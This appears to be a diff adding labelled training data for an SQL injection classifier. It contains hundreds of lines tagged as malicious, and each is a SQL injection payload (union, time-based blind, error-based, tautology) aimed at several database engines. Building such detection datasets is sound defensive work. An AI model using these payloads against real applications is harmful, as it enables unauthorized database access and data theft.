+__label__malicious  1 where 3175 = 3175 or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --
+__label__malicious  1'+ ( select 'jtvq' where 8288 = 8288 and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #
+__label__malicious  1'|| ( select 'oxam' from dual where 7162 = 7162 and make_set ( 8403 = 8403,8899  )  )  ||'
+__label__malicious  1', ( select  ( case when  ( 5217 = 5217 )  then 1 else 5217* ( select 5217 from mysql.db )  end  )  )  
+__label__malicious  -3100' )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( 'etuj' like 'etuj
+__label__malicious  1%"  )  )   )  union all select null,null,null,null,null,null,null,null,null#
+__label__malicious  1'+ ( select 'cstd' where 9326 = 9326 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   ) +'
+__label__malicious   select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1
+__label__malicious  1 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 ) 
+__label__malicious  1 )  where 4711 = 4711
+__label__malicious  1"  )  )   as nwnp where 6140 = 6140
+__label__malicious  -6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--
+__label__malicious  -1434'  )  )   union all select 4734,4734,4734,4734,4734,4734,4734,4734,4734,4734#
+__label__malicious  -7559" or 8792 = 6905--
+__label__malicious  1'+ ( select jxgx where 7446 = 7446 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --
+__label__malicious  '  )  )  ;waitfor delay '0:0:__TIME__'--
+__label__malicious  1' and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  
+__label__malicious  1'  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (   ( 'ljhc' = 'ljhc
+__label__malicious  1%'  )  )   )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( '%' = '
+__label__malicious  1' and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and 'mepp' = 'mepp
+__label__malicious  -8245"  )  )   or 3038 = 3038
+__label__malicious  1'+ ( select 'zkuf' where 3591 = 3591 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null  )  )  +'
+__label__malicious  -3997'+ ( select 'avjk' where 1917 = 1917 union all select 1917,1917,1917--
+__label__malicious  1"  )  )   as vxkn where 2443 = 2443 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --
+__label__malicious  1'|| ( select 'fzcu' where 9252 = 9252 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1  )  )  ||'
+__label__malicious  1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and 'pbin' = 'pbin
+__label__malicious  1" where 7279 = 7279 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #
+__label__malicious  1 union all select null,null,null,null,null,null,null#
+__label__malicious  1%'  )  )   )  and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --
+__label__malicious  1 )  where 8041 = 8041
+__label__malicious  1 )  union all select null,null,null--
+__label__malicious  1 )  as hlcn where 1165 = 1165 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #
+__label__malicious  select count ( * )  from generate_series ( 1,5000000 )  and  ( 'qpdu' = 'qpdu
+__label__malicious  a
+__label__malicious  -9721' )  or 9287 = 4362#
+__label__malicious  1'  )  )   and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and   (  (  'inrm' like 'inrm
+__label__malicious  1' and  ( 5116 = 1602 ) *1602
+__label__malicious  1"  )  )   as phis where 4420 = 4420 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --
+__label__malicious  1 )  as jmib where 8130 = 8130 rlike  ( select  ( case when  ( 7885 = 3932 )  then 1 else 0x28 end  )  )  --
+__label__malicious  -9014%' )  union all select 4211,4211,4211,4211,4211,4211#
+__label__malicious  -3059' )  as jhbh where 4056 = 4056 or  ( 3498 = 6965 ) *6965--
+__label__malicious  1' where 8469 = 8469
+__label__malicious  1 )  as wuio where 5312 = 5312 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --
+__label__malicious  1  )  )   ) 
+__label__malicious  1 where 3956 = 3956
+__label__malicious  -9697 )  union all select 3052,3052,3052,3052,3052,3052,3052,3052,3052--
+__label__malicious  -1031%" union all select 6832,6832,6832,6832#
+__label__malicious  1'+ ( select 'sbvh' where 8539 = 8539 and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  )  +'
+__label__malicious  1' where 9816 = 9816 and 7533 = 7533--
+__label__malicious  -5587%' )  or elt ( 1032 = 1032,3623 )  and  ( '%' = '
+__label__malicious  1%'  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (   ( '%' = '
+__label__malicious   ( select * from generate_series ( 3906,3906,case when  ( 3906 = 3906 )  then 1 else 0 end )  limit 1 ) 
+__label__malicious  1'  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and 'hqqj' = 'hqqj
+__label__malicious  1'  )  )   )  rlike sleep ( 5 )  and   (  (   ( 'rozr' like 'rozr
+__label__malicious  1" where 8734 = 8734
+__label__malicious  1  )  )   as xovu where 4530 = 4530 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --
+__label__malicious  select  ( case when  ( 1275 = 7674 )  then 1275 else 1275* ( select 1275 from information_schema.character_sets )  end ) #
+__label__malicious  select  ( case when  ( 4666 = 4666 )  then 1 else 4666* ( select 4666 from master..sysdatabases )  end ) --
+__label__malicious  1 )  or elt ( 6272 = 6272,sleep ( 5  )  )   and  ( 8600 = 8600
+__label__malicious  select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (   ( 'qvoy' = 'qvoy
+__label__malicious  1%' )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and  ( '%' = '
+__label__malicious  -8629 where 8049 = 8049 union all select 8049,8049,8049,8049,8049,8049,8049#
+__label__malicious  1" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and "ekjs" like "ekjs
+__label__malicious  1' and 5967 = 4184#
+__label__malicious  -5597' )  or make_set ( 2490 = 2164,2164 ) 
+__label__malicious  -8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#
+__label__malicious  1  )  )   as ehlg where 6340 = 6340
+__label__malicious   ( case when 8422 = 8452 then 1 else null end ) 
+__label__malicious  -8124 )  union all select 7251,7251,7251#
+__label__malicious  1%"  )  )   or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (  "%" = "
+__label__malicious  -6720'  )  )   )  or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( 'enfe' like 'enfe
+__label__malicious  1  )  )   union all select null,null,null,null,null,null,null,null,null#
+__label__malicious  1 )  as qywz where 1864 = 1864 and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --
+__label__malicious  1' or '1' = '1
+__label__malicious  1%' )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and  ( '%' = '
+__label__malicious  -6587' )  union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--
+__label__malicious  1'+ ( select zmbu where 8685 = 8685 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   ) +'
+__label__malicious  1" )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( "bmbg" like "bmbg
+__label__malicious  1%' )  union all select null,null,null,null,null,null--
+__label__malicious  1' where 9416 = 9416
+__label__malicious  -3648' where 4629 = 4629 order by 1--
+__label__malicious  select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (   ( 'juhi' like 'juhi
+__label__malicious  1' )  as bscn where 6907 = 6907
+__label__malicious  1%" )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( "%" = "
+__label__malicious  -1219' )  or 5592 = 4835
+__label__malicious  1%"  )  )   )  and elt ( 9524 = 1124,1124 )  and   (  (   ( "%" = "
+__label__malicious  1'  )  )   as xqam where 6750 = 6750
+__label__malicious  -4248 where 3288 = 3288 or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --
+__label__malicious  call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( 'ckpm' = 'ckpm
+__label__malicious  1 )  as hhly where 2906 = 2906
+__label__malicious  1' )  as ncou where 9166 = 9166 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) --
+__label__malicious  -3230"  )  )   as kbxc where 5007 = 5007 or 2107 = 8818
+__label__malicious  -2715'  )  )   or 6942 = 1636 and   (  (  'mqeq' = 'mqeq
+__label__malicious  1" )  as uorp where 7208 = 7208
+__label__malicious  -2048  )  )   union all select 7054,7054,7054,7054,7054,7054,7054,7054,7054--
+__label__malicious  -4607'|| ( select 'wkdg' where 7524 = 7524 order by 1--
+__label__malicious  1 where 8506 = 8506
+__label__malicious  1' )  union all select null,null,null,null#
+__label__malicious  -5526 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #
+__label__malicious  1 )  or sleep ( 5 ) 
+__label__malicious  -2140  )  )   union all select 8174,8174,8174#
+__label__malicious  if ( 4947 = 5350 )  select 4947 else drop function ereg--
+__label__malicious  1' )  as zxho where 5907 = 5907 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --
+__label__malicious  1%' )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( '%' = '
+__label__malicious  1 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) 
+__label__malicious  1" )  where 2180 = 2180 and make_set ( 8403 = 8403,8899 ) --
+__label__malicious  -7323%" or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and "%" = "
+__label__malicious  select  ( case when  ( 4393 = 2875 )  then 1 else 4393* ( select 4393 from master..sysdatabases )  end ) --
+__label__malicious  1  )  )   or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --
+__label__malicious  1'  )  )   and  ( 3020 = 3020 ) *6703 and   (  (  'mgfd' = 'mgfd
+__label__malicious  -6760 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) # ikqw
+__label__malicious  1'|| ( select 'eils' where 8308 = 8308 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #
+__label__malicious  1 )  as ratg where 3033 = 3033 union all select null--
+__label__malicious  1"  )  )   and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  "rvuz" like "rvuz
+__label__malicious  1"  )  )   )  or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( "ddun" = "ddun
+__label__malicious  1 and elt ( 1210 = 1210,sleep ( 5  )  )  
+__label__malicious  1" where 4294 = 4294 and make_set ( 2543 = 7988,7988 ) --
+__label__malicious  1, ( select  ( case when  ( 2106 = 2106 )  then  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  else 2106* ( select 2106 from master..sysdatabases )  end  )  )  
+__label__malicious  1' in boolean mode )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) #
+__label__malicious   or 1 = 1--
+__label__malicious  1'+ ( select zukr where 9215 = 9215 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null  )  )  +'
+__label__malicious  1%" )  union all select null,null,null,null--
+__label__malicious  1' )  and sleep ( 5 ) 
+__label__malicious  1'  )  )   and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  'yzdp' = 'yzdp
+__label__malicious  1%" or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --
+__label__malicious  -1084 where 1181 = 1181 or make_set ( 9354 = 9354,7185 ) --
+__label__malicious  " or 1 = 1--
+__label__malicious  call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and  ( 'cixa' like 'cixa
+__label__malicious  1 )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and  ( 7079 = 7079
+__label__malicious  1'  )  )   as fcjk where 7755 = 7755
+__label__malicious  1'|| ( select 'aojt' from dual where 8499 = 8499
+__label__malicious  1%" )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and  ( "%" = "
+__label__malicious  1" union all select null,null,null,null,null,null,null,null,null,null#
+__label__malicious  -7306" or 2081 = 6847
+__label__malicious  1' )  where 9516 = 9516
+__label__malicious  1  )  )   or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --
+__label__malicious  1%" or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --
+__label__malicious  1'+ ( select 'yhcf' where 8367 = 8367
+__label__malicious  1%"  )  )   order by 1--
+__label__malicious  1 )  where 8630 = 8630 union all select null,null--
+__label__malicious  1' or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and 'ebuo' = 'ebuo
+__label__malicious  -6566' )  as kggb where 9768 = 9768 order by 1--
+__label__malicious   select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1
+__label__malicious  1 )  as bzuh where 8041 = 8041 and 6307 = 9200#
+__label__malicious  1"  )  )   )  or sleep ( 5 ) #
+__label__malicious  1'+ ( select uhsy where 4596 = 4596 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno  )  )  +'
+__label__malicious   ( select chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7812 = 7812 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 )  from dual ) 
+__label__malicious  1, ( select  ( case when  ( 3717 = 3717 )  then 1 else 3717* ( select 3717 from master..sysdatabases )  end  )  )  
+__label__malicious  1' procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) 
+__label__malicious  -3938%'  )  )   )  or 2034 = 7209#
+__label__malicious  1' and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and 'rtbm' = 'rtbm
+__label__malicious  1 )  where 1443 = 1443 union all select null,null,null,null,null#
+__label__malicious  1" )  where 5065 = 5065
+__label__malicious  -8364' )  union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#
+__label__malicious  -1558 or elt ( 3306 = 2272,2272 ) -- ioxt
+__label__malicious  1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) 
+__label__malicious  1, ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4250 = 4250 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) 
+__label__malicious  1" )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and  ( "cdnc" like "cdnc
+__label__malicious  1%'  )  )   and 2006 = 2006
+__label__malicious  1" )  where 9115 = 9115
+__label__malicious  1' where 8837 = 8837 and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --
+__label__malicious  select  ( case when  ( 4061 = 1396 )  then 4061 else 1/ ( select 0 )  end ) --
+__label__malicious  1' )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) 
+__label__malicious  -6554'  )  )   )  union all select 4384,4384,4384,4384,4384#
+__label__malicious  1" and  ( 3020 = 3020 ) *6703
+__label__malicious  1%'  )  )   rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #
+__label__malicious  -5826"  )  )   union all select 7192,7192#
+__label__malicious  1 )  where 9059 = 9059 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )  --
+__label__malicious  1' )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( 'ppwh' = 'ppwh
+__label__malicious  1' )  as wtev where 5283 = 5283
+__label__malicious  /**/or/**/1/**/ = /**/1
+__label__malicious  1'  )  )   as ypgz where 8704 = 8704
+__label__malicious  -1174" union all select 4303,4303,4303,4303#
+__label__malicious  1'  )  )   )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --
+__label__malicious  1' or elt ( 6272 = 6272,sleep ( 5  )  )   and 'wdoi' = 'wdoi
+__label__malicious  1'|| ( select 'uiyj' from dual where 8320 = 8320
+__label__malicious  1'|| ( select 'pxkz' where 2207 = 2207 and  ( 3020 = 3020 ) *6703 ) ||'
+__label__malicious  -6680' )  or 5483 = 3031 and  ( 'zxes' = 'zxes
+__label__malicious  ' AND 1 = utl_inaddr.get_host_address  (  (  SELECT global_name FROM global_name  )  )   AND 'i' = 'i
+__label__malicious  1" where 1809 = 1809 and make_set ( 8403 = 8403,8899 ) --
+__label__malicious  1'|| ( select 'dfmw' from dual where 1723 = 1723
+__label__malicious  1'+ ( select 'kicv' where 1976 = 1976 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual  )  )  +'
+__label__malicious   else dbms_lock.sleep ( 0 ) 
+__label__malicious   select * from users where id = 1 or "?[" or 1 = 1 -- 1
+__label__malicious  1 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) -- loao
+__label__malicious  1' )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and  ( 'ngxz' = 'ngxz
+__label__malicious  select case when 9390 = 5752 then 1 else null end--
+__label__malicious  -8686" where 4532 = 4532 or elt ( 3301 = 9065,9065 ) --
+__label__malicious  1' )  and 7533 = 7533
+__label__malicious  1'  )  )   as prxm where 1267 = 1267 and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --
+__label__malicious  1' and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and 'fmkz' like 'fmkz
+__label__malicious  select pg_sleep ( 5 )  and   (  (   ( "%" = "
+__label__malicious  1' in boolean mode )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) #
+__label__malicious  1'|| ( select 'ltqo' where 9080 = 9080 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   ) ||'
+__label__malicious  -2612" )  as iwfj where 3231 = 3231 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --
+__label__malicious  1"  )  )   as uxnc where 8041 = 8041 and 9198 = 9198--
+__label__malicious  1'  )  )   )  and 8162 = 1687 and   (  (   ( 'tdyr' like 'tdyr
+__label__malicious  1' )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 ) 
+__label__malicious  1'  )  )   )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( 'cgiu' = 'cgiu
+__label__malicious  1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 ) -- btqa
+__label__malicious  1" )  as dlfq where 8410 = 8410
+__label__malicious  1"  )  )   as rhea where 2982 = 2982 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) --
+__label__malicious  1" )  as iwri where 4921 = 4921 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) --
+__label__malicious  1%"  )  )   )  union all select null,null,null,null,null,null,null--
+__label__malicious  1" and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and "vziz" = "vziz
+__label__malicious  -3737%" union all select 4452,4452,4452#
+__label__malicious  1' )  where 2121 = 2121 or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --
+__label__malicious  1" )  as kdvb where 2651 = 2651 and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --
+__label__malicious  1"  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and "owzc" like "owzc
+__label__malicious  1"  )  )   as knyf where 8109 = 8109 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --
+__label__malicious  select sleep ( 5 )  and "jvys" like "jvys
+__label__malicious  1'  )  )   )  union all select null,null,null,null,null,null,null,null--
+__label__malicious  c
+__label__malicious  1" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) 
+__label__malicious  -5210" )  where 7176 = 7176 or 6872 = 6872--
+__label__malicious  -4259'  )  )   as usqu where 5419 = 5419 or elt ( 8325 = 8837,8837 ) --
+__label__malicious  select pg_sleep ( 5  )  )  ||'
+__label__malicious  1'  )  )   as cgey where 2130 = 2130 and make_set ( 7914 = 4032,4032 ) --
+__label__malicious  -3250%" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--
+__label__malicious  -1639  )  )   or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  3318 = 3318
+__label__malicious  1'  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and   (  (  'vpqr' = 'vpqr
+__label__malicious  1%"  )  )   )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( "%" = "
+__label__malicious  -1048%" or 3038 = 3038
+__label__malicious  1' in boolean mode )  and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --
+__label__malicious  1%'  )  )   union all select null,null,null,null--
+__label__malicious  1" rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #
+__label__malicious  1, ( select  ( case when  ( 7711 = 7711 )  then 1 else 7711* ( select 7711 from information_schema.character_sets )  end  )  )  
+__label__malicious  1%" )  union all select null,null#
+__label__malicious  select  ( case when  ( 7997 = 1543 )  then 7997 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--
+__label__malicious  1  )  )   as xlww where 5844 = 5844
+__label__malicious  1'  )  )   )  or sleep ( 5 )  and   (  (   ( 'ecur' = 'ecur
+__label__malicious  1%' )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( '%' = '
